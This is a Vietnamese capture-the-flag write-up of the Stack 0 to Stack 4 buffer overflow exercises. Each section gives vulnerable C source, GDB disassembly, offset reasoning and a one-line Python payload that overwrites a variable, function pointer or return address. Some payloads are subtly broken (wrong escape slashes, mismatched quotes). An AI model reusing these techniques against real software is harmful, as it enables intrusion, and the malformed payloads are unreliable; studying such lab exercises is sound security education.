# Write up Binary exploit

| Contents | Solution |
| -------- | -------- |
| Stack 0  | \[x]     |
| Stack 1  | \[x]     |
| Stack 2  | \[x]     |
| Stack 3  | \[x]     |
| Stack 4  | \[x]     |
| Stack 5  | \[n]     |

## Stack 0

Đề cho ta đoạn code c

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Exploitation

Như bài này lỗi nằm ở hàm gets, bạn biết vì sao không **Hàm gets**, không có giới hạn đầu vào cho chương trình , nếu như ta ghi vượt quá vùng buff chỉ định thì sẽ dẫn đến lỗi BOF.

```c

    0x080483f4 <+0>:     push   ebp
    0x080483f5 <+1>:     mov    ebp,esp
    0x080483f7 <+3>:     and    esp,0xfffffff0
    0x080483fa <+6>:     sub    esp,0x60
    0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0
    0x08048405 <+17>:    lea    eax,[esp+0x1c]
    0x08048409 <+21>:    mov    DWORD PTR [esp],eax
    0x0804840c <+24>:    call   0x804830c <gets@plt>
    0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
    0x08048415 <+33>:    test   eax,eax
    0x08048417 <+35>:    je     0x8048427 <main+51>
    0x08048419 <+37>:    mov    DWORD PTR [esp],0x8048500
    0x08048420 <+44>:    call   0x804832c <puts@plt>
    0x08048425 <+49>:    jmp    0x8048433 <main+63>
    0x08048427 <+51>:    mov    DWORD PTR [esp],0x8048529
    0x0804842e <+58>:    call   0x804832c <puts@plt>
    0x08048433 <+63>:    leave
    0x08048434 <+64>:    ret
```

Chương trình được biên dịch sang mã máy.

Như ta thấy tại ô +24 có lệnh call gets và phía bên trên có câu lệnh MOV DWORD PTR\[ESP], lea eax, \[esp+0x1c] đó chính là địa chỉ ô nhớ của buff

Hoặc ta có thể tính được khoảng cách biến modified với buff là bao nhiêu bytes

ta có ct = 0x5c - 0x1c = 64 , vậy ta ghi đè lên buff đủ số bytes còn modifed sẽ 1 byte sẽ dẫn đến win.

Còn mov esp+0x5c là địa chỉ biên modfied = 0, như vậy ta đã hiểu được một số kiến thức của mảng RE rồi đó.

#### Đây là địa chỉ vùng nhớ của buff

Đây là vùng nhớ ban đầu chưa ghi đè

```c
  0xffffce3c:     0xf7fbec68      0xf7fbb000      0x08049620      0xffffce58
  0xffffce4c:     0x080482e8      0xf7fbb3fc      0x08049620      0xffffce88
  0xffffce5c:     0x08048469      0xf7ffd000      0xf7fbb000      0xf7fbb000
  0xffffce6c:     0xf7e08519      0xf7fe22f0      0x00000000      0x0804845b
  0xffffce7c:     0x00000000      0xf7fbb000      0xf7fbb000      0x00000000
  0xffffce8c:     0xf7deeee5      0x00000001      0xffffcf24      0xffffcf2c
  0xffffce9c:     0xffffceb4      0xf7fbb000      0x00000000      0xffffcf08
  0xffffceac:     0x00000000      0xf7ffd000
```

Vùng xong khi được ghi đè lên

```c
  0xffffce3c:     0x61616161      0x61616161      0x61616161      0x61616161
  0xffffce4c:     0x61616161      0x61616161      0x61616161      0x61616161
  0xffffce5c:     0x61616161      0x61616161      0x61616161      0x61616161
  0xffffce6c:     0x61616161      0x61616161      0x61616161      0x61616161
```

Vậy thì biến mofied có bị ghi đè không ? , câu hỏi này lúc đầu mình cũng không rõ nhưng sau khi mình view ra địa chỉ của biến mofied thì ....

```c
  0xffffce7c:     0x00000061      0xf7fbb000      0xf7fbb000      0x00000000
  0xffffce8c:     0xf7deeee5      0x00000001      0xffffcf24      0xffffcf2c
  0xffffce9c:     0xffffceb4      0xf7fbb000
```

Như ta thấy tại địa chỉ 0xffffce7c có giá trị 0x61 thì đó là chữ cái a đã ghi đè lên biến modified vậy là ta đã ghi đè lên 1 byte trên thanh ghi esp+0x5c, rứa là câu hỏi mình đã đúng vì sau khi ghi đè thi biến modified không còn giá trị khác 0 nữa mà nó là bằng 0 cho nên ta sẽ dễ dàng thay đổi chương trình.

### PayLoad

```python
  print('a'*65) | ./stack0
  you have changed the 'modified' variable
```

### Stack 1

Đề cho ta đoạn c

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Exploitation

Bài này như bài trên nhưng bài này nó cho ta các thông như **volatile int modified** , **strcpy** kiểu như một vào cái mới thôi không có gì lạ cả .

Bài anh cũng lỗi **BOF** ta vào GDB

```c
   0x08048464 <+0>:     push   ebp
   0x08048465 <+1>:     mov    ebp,esp
   0x08048467 <+3>:     and    esp,0xfffffff0
   0x0804846a <+6>:     sub    esp,0x60
   0x0804846d <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
   0x08048471 <+13>:    jne    0x8048487 <main+35>
   0x08048473 <+15>:    mov    DWORD PTR [esp+0x4],0x80485a0
   0x0804847b <+23>:    mov    DWORD PTR [esp],0x1
   0x08048482 <+30>:    call   0x8048388 <errx@plt>
   0x08048487 <+35>:    mov    DWORD PTR [esp+0x5c],0x0
   0x0804848f <+43>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048492 <+46>:    add    eax,0x4
   0x08048495 <+49>:    mov    eax,DWORD PTR [eax]
   0x08048497 <+51>:    mov    DWORD PTR [esp+0x4],eax
   0x0804849b <+55>:    lea    eax,[esp+0x1c]
   0x0804849f <+59>:    mov    DWORD PTR [esp],eax
   0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>
   0x080484a7 <+67>:    mov    eax,DWORD PTR [esp+0x5c]
   0x080484ab <+71>:    cmp    eax,0x61626364
   0x080484b0 <+76>:    jne    0x80484c0 <main+92>
   0x080484b2 <+78>:    mov    DWORD PTR [esp],0x80485bc
   0x080484b9 <+85>:    call   0x8048398 <puts@plt>
   0x080484be <+90>:    jmp    0x80484d5 <main+113>
   0x080484c0 <+92>:    mov    edx,DWORD PTR [esp+0x5c]
   0x080484c4 <+96>:    mov    eax,0x80485f3
   0x080484c9 <+101>:   mov    DWORD PTR [esp+0x4],edx
   0x080484cd <+105>:   mov    DWORD PTR [esp],eax
   0x080484d0 <+108>:   call   0x8048378 <printf@plt>
   0x080484d5 <+113>:   leave
   0x080484d6 <+114>:   ret
```

Bài này hint ý tưởng là cần ghi đè lên buff và biến modifind , nhưng tại đây có mofidend phải có giá trị 0x61626364 thì nảy đến win

#### Địa chỉ Buff

Nằm trong eax

```c
0xffffcddc:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcdec:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcdfc:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffce0c:     0x61616161      0x61616161      0x61616161      0x61616161
```

#### Địa chỉ buff và biến đã ghi đè

```c
0xffffcddc:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcdec:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcdfc:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffce0c:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffce1c:     0x63626161      0xf7fb0064      0xf7fbb000      0x00000000
```

Đây có một điểm cần lưu ý bạn biết vì sao số 64 không nằm trong vị trí đầu không.

Cái này do 1 phần về cách lưu trữ dữ liệu theo **Little endian và big endian**

Markup : [Little endian và big endian](https://baoninhsunrise.com/big-endian-la-gi/)

### Payload

```python
  print('a'*65 +'/x64/x63/x62/x61')./stack1
```

### Stack 2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Mấy cách làm trên tương tự

Bài này ta đọc kỹ có hàm **getenv**, gg tìm hiểu thì hàm nay là lấy biến môi trường mà biến gán nó lại là **point**.

## Exploitation

Vậy lỗi ở đây ta chỉ cần đặt GREENTE = \<ký tự ghi đè> -----> đ/c biến modifed cần ghi đè để so sanh bằng bằng 0d0a0d0a thì xin win thôi.

## PayLoad

```
  GREENIE=$(python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'") ./stack2
  you have correctly modified the variable
```

## Stack 3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Exploitation

Bài này gợi ý ta **both gdb and objdump is your friend you determining where the win() function lies in memory** , là cần tìm ra địa chỉ hàm win là sẽ win

Như vậy là cách nào để leek ra nó, như đề gợi ý ta sử dụng gdb or objdump.

Ta có thể dùng câu man objdump để trợ giúp.

```
[-d|--disassemble[=symbol]]
```

* Sau khi ta tìm được trợ giúp thì ta cần câu lệnh này

```
objdump -d stack3 | grep 'win' : 0x8048424
```

Như vậy ta đã có đủ thông tin rồi.

## PayLoad

```python
 python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3
```

## Stack 4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Exploitation

Bài này đọc sơ thì chỉ cần tìm khoảng cách buff đến ret addr

```
   0x08048408 <+0>:     push   ebp
   0x08048409 <+1>:     mov    ebp,esp
   0x0804840b <+3>:     and    esp,0xfffffff0
   0x0804840e <+6>:     sub    esp,0x50
   0x08048411 <+9>:     lea    eax,[esp+0x10]
   0x08048415 <+13>:    mov    DWORD PTR [esp],eax
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave
   0x0804841e <+22>:    ret
```

Ta có thể thấy esp dành ra 0x50 memory layout để chưa biến và hàm vậy làm cách nào để tính , ta lấy 0x50 - 4 , vì sao trừ bốn vì tạo vùng nhớ có đ/c đó lấy đi 4 ký tự gì đó thì đó là 4 bytes.

Vậy ta được 76 ký tự (bytes) với đ/c hàm win.

## PayLoad

```python
 python -c "print 'A' * 76 + ' '\xf4\x83\x04\x08''" | ./stack4
``
```
